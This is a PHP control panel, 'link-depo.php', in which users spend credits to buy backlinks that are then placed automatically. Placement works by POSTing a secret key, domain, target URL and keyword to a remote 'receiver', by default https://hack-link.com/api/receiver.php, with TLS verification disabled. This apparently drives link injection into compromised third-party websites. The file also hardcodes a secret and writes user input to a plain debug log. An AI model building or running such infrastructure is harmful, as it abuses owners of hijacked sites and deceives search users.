<?php
// =======================================================================
// link-depo.php — User Panel (Fixed for New Link Polling)
// Search + Pagination + Single Buy + Bulk Add + Purchase Lock + Auto Place
// =======================================================================

// Handle AJAX requests first to avoid output
if (!empty($_GET['ajax'])) {
    // Start session and load DB for AJAX
    if (session_status() === PHP_SESSION_NONE) session_start();
    
    // Load database connection
    require_once 'config.php'; // Same as used in header.php
    
    // Manual user authentication for AJAX
    if (empty($_SESSION['user'])) {
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok' => 0, 'msg' => 'Not logged in']);
        exit;
    }
    
    $user = is_object($_SESSION['user']) ? $_SESSION['user'] : (object)$_SESSION['user'];
    $uid  = (int)$user->id;
} else {
    // Normal page load
    include "header.php";
    if (empty($_SESSION['user'])) {
        redirect("login.php");
        exit;
    }
    $user = is_object($_SESSION['user']) ? $_SESSION['user'] : (object)$_SESSION['user'];
    $uid  = (int)$user->id;
}

// --------------------------- Helpers ---------------------------
function esc($v) { return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8'); }
function dbx($v) { global $db; return (isset($db) && method_exists($db,'escape')) ? $db->escape($v) : addslashes($v); }
function has_col($table, $col) {
    static $cache = [];
    $key = $table.'|'.$col;
    if (isset($cache[$key])) return $cache[$key];
    global $db;
    try {
        $exists = (int)$db->get_var(
            "SELECT COUNT(*) FROM information_schema.columns 
             WHERE table_schema=DATABASE() AND table_name='".dbx($table)."' AND column_name='".dbx($col)."'"
        );
        return $cache[$key] = ($exists > 0);
    } catch (Throwable $e) {
        return $cache[$key] = false;
    }
}
function json_exit($arr) {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    echo json_encode($arr);
    exit;
}
function debug_log($message) {
    $log_file = 'debug.log';
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
}

// --------------------------- SETTINGS ---------------------------
$COST_PER_LINK = 1; // প্রতি লিংক ১ ক্রেডিট

// --------------------------- Ensure placement log table ---------------------------
try {
    $db->query("CREATE TABLE IF NOT EXISTS k_link_placements (
        id INT AUTO_INCREMENT PRIMARY KEY,
        uid INT NOT NULL,
        lid INT NOT NULL,
        domain VARCHAR(255),
        target_url VARCHAR(255),
        keyword VARCHAR(255),
        status ENUM('pending','success','failed') DEFAULT 'pending',
        api_response TEXT,
        receiver_id INT DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
    debug_log("k_link_placements table ensured");
} catch (Throwable $e) {
    debug_log("Error creating k_link_placements: " . $e->getMessage());
}

// --------------------------- Ensure receivers table ---------------------------
try {
    $db->query("CREATE TABLE IF NOT EXISTS k_receivers (
        id INT AUTO_INCREMENT PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        receiver_url VARCHAR(500) NOT NULL,
        secret_key VARCHAR(255) NOT NULL,
        status ENUM('active','inactive') DEFAULT 'active',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_status (status)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
    
    $count = (int)$db->get_var("SELECT COUNT(*) FROM k_receivers WHERE status='active'");
    if ($count == 0) {
        $db->query("INSERT INTO k_receivers (name, receiver_url, secret_key, status) VALUES 
            ('Default Receiver', 'https://hack-link.com/api/receiver.php', 'my_secret_key_12345', 'active')");
        debug_log("Inserted default receiver");
    }
} catch (Throwable $e) {
    debug_log("Error creating k_receivers: " . $e->getMessage());
}

// --------------------------- USER CREDIT ---------------------------
$credit = 0;
try {
    $credit = (int)$db->get_var("SELECT kredi FROM k_users WHERE id='{$uid}'");
    debug_log("User credit fetched: uid=$uid, credit=$credit");
} catch (Throwable $e) {
    $credit = 0;
    debug_log("Error fetching user credit: " . $e->getMessage());
}

// --------------------------- Build columns ---------------------------
$cols = "id, domain, link, tip, durum, ups, alexa1, alexa2";
$has_year     = has_col('k_linkdb', 'domain_year');
$has_sure     = has_col('k_linkdb', 'sure');
$has_added    = has_col('k_linkdb', 'created_at');
$has_added2   = has_col('k_linkdb', 'added_at');
$has_country  = has_col('k_linkdb', 'country');

if ($has_year)   $cols .= ", domain_year";
if ($has_sure)   $cols .= ", sure";
if ($has_added)  $cols .= ", created_at";
if ($has_added2) $cols .= ", added_at";
if ($has_country)$cols .= ", country";

// --------------------------- Stats ---------------------------
$totalLinks  = (int)$db->get_var("SELECT COUNT(*) FROM k_linkdb WHERE durum='1' OR durum IS NULL");
$totalCredit = (int)$db->get_var("SELECT COALESCE(SUM(ups),0) FROM k_linkdb WHERE durum='1' OR durum IS NULL");
$phpCount    = (int)$db->get_var("SELECT COUNT(*) FROM k_linkdb WHERE tip=1 AND (durum='1' OR durum IS NULL)");
$jsCount     = (int)$db->get_var("SELECT COUNT(*) FROM k_linkdb WHERE tip=2 AND (durum='1' OR durum IS NULL)");
debug_log("Stats: totalLinks=$totalLinks, totalCredit=$totalCredit, phpCount=$phpCount, jsCount=$jsCount");

// --------------------------- Rows (active only) ---------------------------
$rows = $db->get_results("SELECT {$cols} FROM k_linkdb WHERE durum='1' OR durum IS NULL ORDER BY id DESC LIMIT 500");
debug_log("Initial fetch: " . count($rows) . " rows from k_linkdb");

// --------------------------- Already purchased ---------------------------
$purchased_ids = $db->get_col("SELECT l.id FROM k_orders o LEFT JOIN k_linkdb l ON l.id=o.lid WHERE o.uid='{$uid}'");
$purchased_set = [];
if ($purchased_ids) {
    foreach ($purchased_ids as $lid) $purchased_set[(int)$lid] = true;
    debug_log("Purchased links for uid=$uid: " . count($purchased_ids));
}

// ---------- Auto Backlink Placement (multi-client ready) ----------
function auto_place_link($lid, $domain, $target_url, $keyword, $receiver_id=1) {
    global $db, $uid;
    debug_log("Attempting to place link: lid=$lid, domain=$domain, target_url=$target_url, keyword=$keyword, receiver_id=$receiver_id");

    $rcv = $db->get_row("SELECT receiver_url, secret_key FROM k_receivers WHERE id='{$receiver_id}' AND status='active'");
    if (!$rcv) {
        debug_log("No active receiver found for receiver_id=$receiver_id");
        return false;
    }

    $url = $rcv->receiver_url;
    $secret = $rcv->secret_key;

    try {
        $db->query("INSERT INTO k_link_placements (uid,lid,domain,target_url,keyword,receiver_id,status,created_at)
            VALUES ('{$uid}','{$lid}','".dbx($domain)."','".dbx($target_url)."','".dbx($keyword)."','{$receiver_id}','pending',NOW())");
        $pid = (int)$db->insert_id;
        debug_log("Inserted placement log: pid=$pid");
    } catch (Throwable $e) {
        $pid = 0;
        debug_log("Error inserting placement log: " . $e->getMessage());
    }

    $payload = [
        'secret' => $secret,
        'operation' => 'place_link',
        'domain' => $domain,
        'target_url' => $target_url,
        'keyword' => $keyword
    ];

    $resp = '';
    $ok = false;
    try {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 25,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        $resp = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);

        if ($err) {
            $resp = "cURL error: ".$err;
            debug_log("cURL error in auto_place_link: $err");
        } else {
            $r = json_decode($resp, true);
            $ok = (is_array($r) && !empty($r['ok']));
            debug_log("API response: " . json_encode($r));
        }
    } catch (Throwable $e) {
        $resp = "Exception: ".$e->getMessage();
        debug_log("Exception in auto_place_link: " . $e->getMessage());
    }

    $status = $ok ? 'success' : 'failed';
    if ($pid > 0) {
        $db->query("UPDATE k_link_placements SET status='{$status}', api_response='".dbx($resp)."' WHERE id='{$pid}'");
    }

    return $ok;
}

// =======================================================================
// AJAX ENDPOINTS
// =======================================================================
if (!empty($_GET['ajax'])) {
    $ajax = $_GET['ajax'];

    // ---- Stats Endpoint ----
    if ($ajax === 'stats') {
        try {
            $totalLinks  = (int)$db->get_var("SELECT COUNT(*) FROM k_linkdb WHERE durum='1' OR durum IS NULL");
            $totalCredit = (int)$db->get_var("SELECT COALESCE(SUM(ups),0) FROM k_linkdb WHERE durum='1' OR durum IS NULL");
            $phpCount    = (int)$db->get_var("SELECT COUNT(*) FROM k_linkdb WHERE tip=1 AND (durum='1' OR durum IS NULL)");
            $jsCount     = (int)$db->get_var("SELECT COUNT(*) FROM k_linkdb WHERE tip=2 AND (durum='1' OR durum IS NULL)");
            json_exit([
                'ok' => 1,
                'totalLinks' => $totalLinks,
                'totalCredit' => $totalCredit,
                'phpCount' => $phpCount,
                'jsCount' => $jsCount
            ]);
        } catch (Throwable $e) {
            debug_log("Error in stats endpoint: " . $e->getMessage());
            json_exit(['ok' => 0, 'msg' => 'Server error']);
        }
    }

    // ---- Single Buy ----
    if ($ajax === 'buy' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        try {
            $lid = (int)($_POST['lid'] ?? 0);
            $target_url = trim($_POST['target_url'] ?? '');
            $keyword    = trim($_POST['keyword'] ?? '');
            debug_log("Single buy attempt: lid=$lid, target_url=$target_url, keyword=$keyword");

            if ($lid <= 0) json_exit(['ok' => 0, 'msg' => 'Invalid link ID']);
            if (empty($target_url)) json_exit(['ok' => 0, 'msg' => 'Target URL is required']);

            $already = (int)$db->get_var("SELECT COUNT(*) FROM k_orders WHERE uid='{$uid}' AND lid='{$lid}'");
            if ($already > 0) json_exit(['ok' => 0, 'msg' => 'Already purchased']);

            $lr = $db->get_row("SELECT id, domain FROM k_linkdb WHERE id='{$lid}'");
            if (!$lr) json_exit(['ok' => 0, 'msg' => 'Link not found']);

            $bal = (int)$db->get_var("SELECT kredi FROM k_users WHERE id='{$uid}'");
            if ($bal < $COST_PER_LINK) json_exit(['ok' => 0, 'msg' => 'Insufficient credits', 'balance' => $bal]);

            $db->query("INSERT INTO k_orders (uid,lid,tarih) VALUES ('{$uid}','{$lid}',NOW())");
            $db->query("UPDATE k_users SET kredi = kredi - {$COST_PER_LINK} WHERE id='{$uid}'");
            $newBal = (int)$db->get_var("SELECT kredi FROM k_users WHERE id='{$uid}'");

            $placed_ok = auto_place_link($lid, $lr->domain, $target_url, $keyword);

            json_exit(['ok' => 1, 'msg' => 'Purchased successfully', 'lid' => $lid, 'new_balance' => $newBal, 'placed' => $placed_ok]);
        } catch (Throwable $e) {
            debug_log("Error in single buy: " . $e->getMessage());
            json_exit(['ok' => 0, 'msg' => 'Server error']);
        }
    }

    // ---- Bulk Add (Buy multiple) ----
    if ($ajax === 'bulk' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        try {
            $ids = $_POST['ids'] ?? [];
            if (!is_array($ids)) $ids = [];
            $ids = array_values(array_unique(array_map('intval', $ids)));

            $site_address = trim($_POST['site_address'] ?? '');
            $keyword      = trim($_POST['keyword'] ?? '');
            debug_log("Bulk buy attempt: ids=" . json_encode($ids) . ", site_address=$site_address");

            if (count($ids) === 0) json_exit(['ok' => 0, 'msg' => 'No selection']);
            if ($site_address === '') json_exit(['ok' => 0, 'msg' => 'Target URL is required']);

            $bal = (int)$db->get_var("SELECT kredi FROM k_users WHERE id='{$uid}'");

            $purchased = [];
            $skipped   = [];

            foreach ($ids as $lid) {
                if ($bal < $COST_PER_LINK) break;

                $exist = (int)$db->get_var("SELECT COUNT(*) FROM k_orders WHERE uid='{$uid}' AND lid='{$lid}'");
                if ($exist > 0) { $skipped[] = $lid; continue; }

                $linkRow = $db->get_row("SELECT id, domain FROM k_linkdb WHERE id='{$lid}'");
                if (!$linkRow) { $skipped[] = $lid; continue; }

                $db->query("INSERT INTO k_orders (uid,lid,tarih) VALUES ('{$uid}','{$lid}',NOW())");
                $db->query("UPDATE k_users SET kredi = kredi - {$COST_PER_LINK} WHERE id='{$uid}'");
                $bal -= $COST_PER_LINK;

                auto_place_link($lid, $linkRow->domain, $site_address, $keyword);
                $purchased[] = $lid;
            }

            $newBal = (int)$db->get_var("SELECT kredi FROM k_users WHERE id='{$uid}'");
            json_exit([
                'ok' => 1,
                'msg' => 'Processed',
                'purchased' => $purchased,
                'skipped' => $skipped,
                'new_balance' => $newBal
            ]);
        } catch (Throwable $e) {
            debug_log("Error in bulk buy: " . $e->getMessage());
            json_exit(['ok' => 0, 'msg' => 'Server error']);
        }
    }

    // ---- New Links (for polling) ----
    if ($ajax === 'new_links' && $_SERVER['REQUEST_METHOD'] === 'GET') {
        try {
            $last_id = (int)($_GET['last_id'] ?? 0);
            $query = "SELECT {$cols} FROM k_linkdb WHERE id > '{$last_id}' AND (durum='1' OR durum IS NULL)";
            $query .= " ORDER BY id DESC LIMIT 100";
            $new_rows = $db->get_results($query);
            debug_log("New links query: $query, fetched " . count($new_rows) . " rows");

            $purchased_ids = $db->get_col("SELECT lid FROM k_orders WHERE uid='{$uid}'");
            $purchased_set = array_flip($purchased_ids);
            $links = [];
            foreach ($new_rows as $r) {
                $links[] = [
                    'id' => (int)$r->id,
                    'domain' => $r->domain,
                    'alexa1' => (int)($r->alexa1 ?? 0),
                    'alexa2' => (int)($r->alexa2 ?? 0),
                    'tip' => (int)$r->tip,
                    'domain_year' => isset($r->domain_year) ? $r->domain_year : '–',
                    'sure' => isset($r->sure) ? $r->sure : '–',
                    'created_at' => isset($r->created_at) ? $r->created_at : (isset($r->added_at) ? $r->added_at : '–'),
                    'country' => isset($r->country) ? $r->country : '–',
                    'is_purchased' => isset($purchased_set[$r->id])
                ];
            }
            debug_log("Returning " . count($links) . " new links for last_id=$last_id");
            json_exit(['ok' => 1, 'links' => $links, 'last_id' => $last_id, 'row_count' => count($new_rows)]);
        } catch (Throwable $e) {
            debug_log("Error in new_links endpoint: " . $e->getMessage());
            json_exit(['ok' => 0, 'msg' => 'Server error: ' . $e->getMessage()]);
        }
    }

    json_exit(['ok' => 0, 'msg' => 'Unknown endpoint']);
}
?>
